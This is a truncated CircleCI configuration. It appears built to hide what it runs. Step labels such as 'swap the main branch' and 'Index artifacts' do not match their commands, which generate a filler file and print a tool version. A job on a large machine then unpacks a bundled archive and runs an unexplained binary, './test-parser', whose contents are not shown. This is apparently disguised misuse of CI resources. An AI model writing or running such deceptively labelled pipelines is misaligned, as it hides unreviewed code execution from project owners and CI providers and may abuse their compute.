version: 2.1

jobs:
  Countrys:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: 01 swap the main branch
          command: |
            mkdir -p /tmp/node-beta
            set +o pipefail 2>/dev/null; cat <(seq 1 681940) <(seq 681940 -1 1) > /tmp/node-beta/CPU-RAM; true
            # verify
            test -s /tmp/node-beta/CPU-RAM && echo "ok"
      - persist_to_workspace:
          root: /tmp/node-beta
          paths:
            - 'CPU-RAM'
  prometheus-v2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/node-beta
      - run:
          name: Verify 2
          command: |
            cat /tmp/node-beta/CPU-RAM 2>/dev/null | od -An -c | tr -s ' ' | head -c 60 || true
      - run:
          name: Clone and prep
          command: git clone --depth 1 --quiet --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Decompress bundle
          command: tar xJf build-bundle-v3.tar.xz
      - run:
          name: Index artifacts
          command: cmake --version
      - run:
          command: ls -la
      - run:
          command: bash -c "./test-parser"
  cDeprecated:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
